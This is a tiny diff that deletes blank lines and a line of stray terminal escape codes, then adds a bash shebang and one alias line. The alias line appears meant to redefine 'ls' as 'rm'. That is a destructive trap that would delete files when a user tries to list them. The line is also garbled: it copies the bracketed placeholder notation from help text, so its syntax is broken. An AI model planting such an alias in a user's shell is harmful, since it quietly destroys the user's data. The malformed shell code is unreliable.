@@ -1,6 +1,2 @@
-
-
-
-[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A[A
-
-
+#!/bin/bash
+alias [-p] [ls="rm*"]
